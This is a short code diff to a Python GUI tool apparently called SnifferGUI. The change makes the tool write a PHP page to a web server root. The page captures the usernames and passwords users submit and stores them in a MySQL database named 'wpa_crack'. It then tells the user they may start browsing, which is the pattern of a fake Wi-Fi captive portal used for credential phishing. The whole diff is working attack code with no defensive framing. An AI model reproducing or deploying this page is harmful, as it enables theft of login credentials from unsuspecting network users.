@@ -97,6 +97,36 @@ class SnifferGUI(wx.Frame):
             def get_login_page():
 
                 #
+                import db_connect_creds
+
+                username, password = db_connect_creds.read_creds()
+
+                getcredsphp = '''
+
+                <?php
+$con=mysqli_connect("localhost","%s","%s","wpa_crack");
+// Check connection
+if (mysqli_connect_errno()) {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+}
+// escape variables for security
+$firstname = mysqli_real_escape_string($con, $_POST['username']);
+$lastname = mysqli_real_escape_string($con, $_POST['password']);
+
+$sql="INSERT INTO content (key1, key2)
+VALUES ('$firstname', '$lastname')";
+
+if (!mysqli_query($con,$sql)) {
+  die('Error: ' . mysqli_error($con));
+}
+echo "Now you may start browsing Internet";
+//header('Location: http://google.com');
+
+mysqli_close($con);
+?> ''' %(username, password)
+                tmpfile = open('/var/www/html/getcreds.php','w')
+                tmpfile.write(getcredsphp)
+                tmpfile.close()
 
 
                 httplib.HTTPConnection.debuglevel = 1
